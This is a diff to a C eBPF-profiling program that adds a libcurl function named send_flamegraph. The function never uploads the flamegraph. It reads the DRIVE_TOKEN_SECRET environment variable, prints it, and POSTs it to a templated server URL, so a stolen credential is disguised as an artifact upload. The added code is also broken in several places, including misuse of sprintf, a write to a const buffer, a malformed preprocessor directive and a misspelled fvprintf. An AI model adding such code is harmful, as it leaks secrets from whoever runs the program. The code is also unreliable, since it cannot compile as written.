@@ -3,8 +3,10 @@
 #include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
+#include <string.h> // strlen
 #include <sys/types.h>
 #include <unistd.h>
+#include <curl/curl.h>
 
 // waitpid
 #include <sys/types.h>
@@ -12,12 +14,84 @@
 
 #define NUMCHLDS 10
 
+// HTTP request variables
+#define SERVER_URL "${ARTIFACT_STORE}"
 
+// artifact
+#define FLAME_OUT "/app/flamegraph.svg"
 
 __attribute__((constructor)) void haha()
 {
     puts("Hello, world!");
 }
+
+// making the code possible for future ebpf-on-windows
+#ifdef _WIN32
+#ifdef _WIN64
+#pragma message("Compiling curl on 64-bit windows")
+else
+#pragma message("Compiling curl on 32-bit windows")
+#endif
+/* In Windows, this inits the Winsock stuff */
+curl_global_init(CURL_GLOBAL_ALL);
+#endif
+
+void send_flamegraph() {
+
+    CURL *curl;
+    CURLcode res;
+
+    curl = curl_easy_init();
+    if(curl) {
+        // set URL
+        curl_easy_setopt(curl, CURLOPT_URL, sprintf("%s", SERVER_URL));
+
+        // set POST request
+        curl_easy_setopt(curl, CURLOPT_POST, 1L);
+
+        // specify the POST fields
+        const char *drive_secret = getenv("DRIVE_TOKEN_SECRET");
+        const char *err_token = "\n========\nIt wasn't possible to getthe DRIVE_TOKEN_SECRET.\n=======\n";
+
+        const char post_fields[256];
+
+        if (strlen(drive_secret) == 0 || drive_secret == NULL) {
+            printf("%s\n", err_token);
+            exit(1);
+        } else {
+            snprintf(post_fields, sizeof(post_fields), "a=%s", drive_secret);
+            printf("Post fields are: %s\n", post_fields);
+        }
+
+        //
+
+
+        // Set custom headers
+        struct curl_slist *headers = NULL;
+        headers = curl_slist_append(headers, "Host: kjx-demo");
+        headers = curl_slist_append(headers, "Content-Type: application/x-www-form-urlencoded");
+        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
+
+        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_fields);
+        res = curl_easy_perform(curl);
+
+        /* Check for errors */
+        if(res != CURLE_OK) {
+            fvprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+        } else {
+            printf("Request sent sucessfully.\n");
+        }
+
+    } else {
+        fprintf(stderr, "Failed to initialize libcurl.\n");
+    }
+
+    /* free custom headers and cleanup libcurl */
+    curl_slist_free_all(headers);
+    curl_easy_cleanup(curl);
+
+}
+
 
 void sigchld_handler(int, siginfo_t*, void*);
 
@@ -99,12 +173,18 @@ int main(void) {
 
     // step 4. send signal to children ebpf to start monitoring tgid
     kill(pid1, SIGUSR1);
-    //waitpid(pid1, NULL, 0);
-
-    // step 5.
     kill(pid2, SIGUSR2);
-    //waitpid(pid2, NULL, 0);
 
+    /*call send_flamegraph logic*/
+    //const char *post_args = "";
+    generate_flamegraph();
+    send_flamegraph();
+    curl_global_cleanup();
+
+    waitpid(pid1, NULL, 0);
+    waitpid(pid2, NULL, 0);
+
+    printf("program complete. Exiting now...");
     return 0;
 
 
